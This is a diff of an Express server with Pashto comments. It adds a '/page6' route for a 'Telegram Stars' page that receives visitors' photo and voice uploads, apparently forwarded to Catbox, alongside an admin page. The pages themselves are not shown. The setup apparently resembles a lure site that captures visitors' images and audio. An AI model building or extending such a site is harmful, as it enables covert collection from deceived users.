@@ -30,7 +30,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- د ټولو پاڼو مسیرونه (Routes) ---
+// --- پخواني مسیرونه (سکتورونه) ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -47,9 +47,13 @@ app.get('/page4', (req, res) => {
     res.sendFile(path.join(__dirname, 'index4.html'));
 });
 
-// دلته د page5 لپاره د index5.html فایل وصل شو
 app.get('/page5', (req, res) => {
     res.sendFile(path.join(__dirname, 'index5.html'));
+});
+
+// --- نوی اضافه شوی مسیر د Telegram Stars لپاره (/page6) ---
+app.get('/page6', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index6.html'));
 });
 
 // Catbox ته د فایل د اپلوډ کولو فنکشن
@@ -70,7 +74,7 @@ async function uploadToCatbox(buffer, filename) {
     }
 }
 
-// د GET او POST ریکویسټونو لپاره لارې
+// د پوسټ ریکویسټونو لارې د ټولو پاڼو لپاره
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
@@ -84,6 +88,11 @@ app.post('/page4', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
 });
 
 app.post('/page5', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
+    handleIncomingData(req, res);
+});
+
+// د نوي /page6 پاڼې پوسټ ریکویسټ
+app.post('/page6', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
 
@@ -134,7 +143,7 @@ async function handleIncomingData(req, res) {
     res.status(400).send("Bad Request");
 }
 
-// د اډمین پاڼه
+// د اډمین پاڼه (بدون تغیر په پخواني منطق)
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
